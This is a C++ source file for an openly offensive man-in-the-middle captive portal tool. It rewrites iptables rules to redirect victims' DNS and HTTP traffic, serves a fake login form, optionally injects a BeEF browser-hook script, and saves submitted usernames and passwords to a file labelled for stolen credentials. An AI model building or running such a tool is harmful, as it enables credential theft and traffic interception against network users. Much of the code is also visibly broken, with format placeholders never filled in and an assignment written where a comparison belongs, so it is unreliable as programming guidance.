#include </usr/include/stdio.h>
#include <boost/program_options.hpp>
#include <string>
#include <algorithm>
#include <iostream>
#include <fstream>
#include <iterator>
#include <stdio.h>
#include <boost/algorithm/string.hpp>
#include <boost/filesystem.hpp>
//#include "include/boost/process.hpp"
#include <cstdlib>
#include <bits/stdc++.h>
#include <stdlib.h>
#include <boost/network/uri.hpp>
//libhttpserver for debian
#include <httpserver.hpp>
#include <curses.h>
#include <thread>
#include <unistd.h>
#include "termcolor.hpp"

//currently refactoring to colorprint to the output_buffer

//g++ ./main.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses
//namespace process = boost::process;
using namespace std;
using namespace httpserver;

namespace filesystem = boost::filesystem;
namespace options    = boost::program_options;
namespace url_parse  = boost::network::uri;

bool hook;
int PORT;
std::string  credentials_file;
//std::vector[] username_password_pair;
//std::string username_password_array[];

std::string document_root;
std::vector<string> hostslist;
std::string html_redirect_body;
std::string html_form_body;
std::string hook_location;
std::string redirect_ip;
std::string remote_ip;
std::string beef_hook;
std::string addr;
std::string iface;
std::vector<string> output_buffer;
std::vector<char> input_buffer;
bool INPUT_FLAG = true;

WINDOW* window;
WINDOW* output_window;
WINDOW* input_window;
int row = 0, col = 0;

void colorprint(std::string color, std::string text) {
    if (color == "red"){
        std::cout << termcolor::red << text << termcolor::reset << std::endl;
    } else if (color == "green") {
        std::cout << termcolor::green << text << termcolor::reset << std::endl;
    } else if (color == "magenta") {
        std::cout << termcolor::magenta << text << termcolor::reset << std::endl;
    } else if (color == "blue") {
        std::cout << termcolor::blue << text << termcolor::reset << std::endl;
    } else if (color == "grey") {
        std::cout << termcolor::grey << text << termcolor::reset << std::endl;
    } else if (color == "cyan") {
        std::cout << termcolor::cyan << text << termcolor::reset << std::endl;
    } else if (color == "white") {
        std::cout << termcolor::white << text << termcolor::reset << std::endl;
    } else if (color == "yellow") {
        std::cout << termcolor::yellow << text << termcolor::reset << std::endl;
    };
};

void term_init(){
    window = initscr();
    getmaxyx(window, row, col);
    cbreak();
    noecho();
    nonl();
    intrflush(stdscr, FALSE);
    keypad(stdscr, TRUE);
    refresh();
};

void errprint(auto err) {
    colorprint("red" , err);
};

void update_output_window(std::string output_string ){
    touchwin(window);
    output_string += "\n";
    wprintw(output_window, output_string.c_str());
    wrefresh(output_window);
// once we update the output window we want to allow the user to input more commands
// so we set the flag to false again
};

void update_output_windowfrominput(std::string output_string ){
    touchwin(window);
    output_string += "\n";
    wprintw(output_window, output_string.c_str());
    wrefresh(output_window);
// once we update the output window we want to allow the user to input more commands
// so we set the flag to false again
    INPUT_FLAG = false;
};

void process_output_buffer(){
   // std::string output_window_string(output_buffer.begin(),output_buffer.end());
   // update_output_window(output_window_string.c_str());
};

string get_command(){
    while (INPUT_FLAG == true) {
        char input_character = getch();
        //if we hit the enter key, it processes the input buffer to send to the output buffer to send to the output window
        if(input_character = '\r'){
            std::string input_buffer_string(input_buffer.begin(),input_buffer.end());
            update_output_windowfrominput(input_buffer_string);
            INPUT_FLAG = false;
        } else {
            //else we keep taking chars and checking for the backspace
            touchwin(window);
            input_buffer.push_back(input_character);
            // add the character to the input line in the terminal window
            if (input_character == KEY_BACKSPACE) {
                input_buffer.pop_back();

            };
        };
    std::string command(input_buffer.begin(),input_buffer.end());
    input_buffer.clear();
    return command;
    };
};

void make_html(std::string hook_loc, std::string formaction) {
    std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
    std::string html_form_body_top = "<body><form class=\"login\" ";
    std::string form_action = "action=\"" + formaction + "\" ";
    std::string html_form_body_bottom = " method=\"post\">\
        <input type=\"text\" name=\"username\" value=\"username\">\
        <input type=\"text\" name=\"password\" value=\"password\">\
        <input type=\"submit\" name=\"submit\" value=\"submit\">\
        </form>\
        </body>\
        </html>";
    std::string html_redirect_head = "<html><head>";
    beef_hook = "<script src=" + hook_loc + "></script>";
    std::string html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
    std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
    html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
    html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
};


int parse_commandline(int argc, char* argv[]){
    options::options_description desc("Captive portal server");
    desc.add_options()
        ("help,h", "Print Help Message" )
        ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
        ("port,p", options::value<int>()->default_value(80), "port to serve the portal on")
        ("Iface,i", options::value< std::string >()->default_value("eth0"), "Interface to use, must be capable of monitor mode." )
        ("beef-hook,b", options::value< std::string >()->default_value("false"), "Trigger for beef" )
        ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
        ("external-html,e", options::value<std::string>()->default_value("false"), "switch for serving external document instead of internal form. type 'true' OR NOTHING")
        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server ")

    ;
    options::variables_map arguments;
    options::store(options::parse_command_line(argc , argv, desc), arguments);
    try {
        options::notify(arguments);
    } catch (std::exception& e) {
        auto errortext = e.what();
        errprint(errortext);
        return 1;
    };
    if (arguments.count("help")) {
        cout << desc << "\n";
        return 1;
    };
    if (arguments.count("beef-hook") == 'true') {
        hook_location = arguments["address"].as<std::string>();
        hook_location = hook_location + ":3000";
        system("service beef start");
    } else {
        hook_location = "";
    };
    if (arguments.count("external-html") == 'true') {
        //auto pwd = filesystem::current_path();
        //document_root = pwd + arguments
    };

    document_root = arguments["document-root"].as<std::string>();
    credentials_file = arguments["credentials"].as<std::string>();
    PORT = arguments["port"].as<int>();
    redirect_ip =  arguments["address"].as<std::string>() + "/login";
    addr = arguments["address"].as<std::string>();
};

class CaptivePortal : public http_resource {
public:
    const std::shared_ptr<http_response> render_GET(const http_request& request) {
        colorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
        return std::shared_ptr<http_response>(new string_response(html_redirect_body));
    };

    const std::shared_ptr<http_response> render_POST(const http_request& request) {
        remote_ip = request.get_requestor();

        authpassthrough(remote_ip);
        colorprint("green", ("Host %host Authorized", remote_ip));
        save_credentials(request.get_user(), request.get_pass());
        return std::shared_ptr<http_response>(new string_response("you may now browse freely, I stole your password!"));
    };

    void authpassthrough(std::string remoteip){
        system(("iptables -t nat -I PREROUTING 1 -s $remoteip -j ACCEPT", remoteip).c_str());
        system(("iptables -I FORWARD -s %remoteip-j ACCEPT", remoteip).c_str());
    };

    int save_credentials(std::string username, std::string password){
        try {
            std::string name = username;
            std::string pass = password;
            auto pwd = filesystem::current_path().string();
            std::string file = pwd + credentials_file;
            std::ofstream credentials(file);
            std::string data(name + " : " + pass + "\n");
            credentials << data;
            return 0;
        } catch (std::exception& e) {
            auto errortext = e.what();
            errprint(errortext);
            return 1;
        };
    };

};

class Login : public http_resource {
public:
    const std::shared_ptr<http_response> render_GET(const http_request& request) {
        make_html(hook_location, addr);
        return std::shared_ptr<http_response>(new string_response(html_form_body));

    };
};


void start_server(){
    webserver server = create_webserver(PORT);
    CaptivePortal captiveportal;
    Login login;
    server.register_resource(document_root, &captiveportal);
    server.register_resource("/login", &login);
    server.start(true);
};

int establish_MITM(std::string netiface, std::string ip_addr, std::string port){

    system(("ip link set %i down", netiface).c_str());
    system(("ip addr add %a dev %i", ip_addr, netiface).c_str());
    try {
        system(("iwconfig %i mode monitor", netiface).c_str());
        colorprint("green" , "[+] Monitor Mode Enabled");
        } catch (std::exception& e) {
            auto errortext = e.what();
            errprint(errortext);
            colorprint("yellow" , "[-] Failed to set monitor mode");
            return 1;
        };
    system(("ip link set %i up", netiface).c_str());

    colorprint("green" ,"[+]Clearing IP Tables Rulesets");
    system("iptables -w 3 --flush");
    system("iptables -w 3 --table nat --flush");
    system("iptables -w 3 --delete-chain");
    system("iptables -w 3 --table nat --delete-chain");

    colorprint("green" ,"[+]enable ip Forwarding");
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    colorprint("green" ,"[+]Setup a NAT environment");
    system(("iptables -w 3 --table nat --append POSTROUTING --out-interface %i -j MASQUERADE", netiface).c_str());

    colorprint("yellow" , ".. Block all traffic in");
    system(("iptables -w 3 -A FORWARD -i %i -j DROP", netiface).c_str());

    colorprint("green" ,"[+]allow incomming from the outside on the monitor iface");
    system(("iptables -w 3 --append FORWARD --in-interface %i -j ACCEPT", netiface).c_str());

    colorprint("green" ,"[+]allow UDP DNS resolution inside the NAT  via prerouting");
    system(("iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ", ip_addr).c_str());

    colorprint("green" ,"[+]Allow Loopback Connections");
    system("iptables -w 3 -A INPUT -i lo -j ACCEPT");
    system("iptables -w 3 -A OUTPUT -o lo -j ACCEPT");

    colorprint("green" ,"[+]Allow Established and Related Incoming Connections");
    system("iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT");

    colorprint("green" ,"[+]Allow Established Outgoing Connections");
    system("iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT");

    //#colorprint("green" ,("[+]Internal to External")
    //system("iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface))

    colorprint("green" ,"[+]Drop Invalid Packets");
    system("iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP");
    system("iptables -w 3 -A FORWARD -i %i -p tcp --dport 53 -j ACCEPT");
    system("iptables -w 3 -A FORWARD -i %i -p udp --dport 53 -j ACCEPT");

    colorprint("yellow" , ".. Allow traffic to captive portal");
    system(("iptables -w 3 -A FORWARD -i %i -p tcp --dport %p -d %i -j ACCEPT", netiface, port, ip_addr).c_str());
/*   ###################################################
    #
    #       HERE IS WHERE THE WERVER IS STARTED
    #
    #
    ###################################################*/
    colorprint("green" ,"Redirecting HTTP traffic to captive portal");
    system(("iptables -t nat -A PREROUTING -i %i -p tcp --dport 80 -j DNAT --to-destination %d", netiface, ip_addr).c_str());

};
int main(int argc, char* argv[]) {
    term_init();
    //auto pwd = filesystem::current_path();

    //parse_commandline(argc, argv);
    fflush(stdin);

    start_server();

    INPUT_FLAG = true;
    output_window = subwin(window, row - 1, col, 0, 0);

    scrollok(output_window, true);
    input_window = subwin(window, 1, col, row - 1, 0);

    std::thread input_line(get_command);
    //std::thread nthr(nmonitor);

    while(1)
    {
        std::string input(get_command());
        if(input == "quit"){
            break;
        } else {
            get_command();
        };
    endwin();
    };
};

















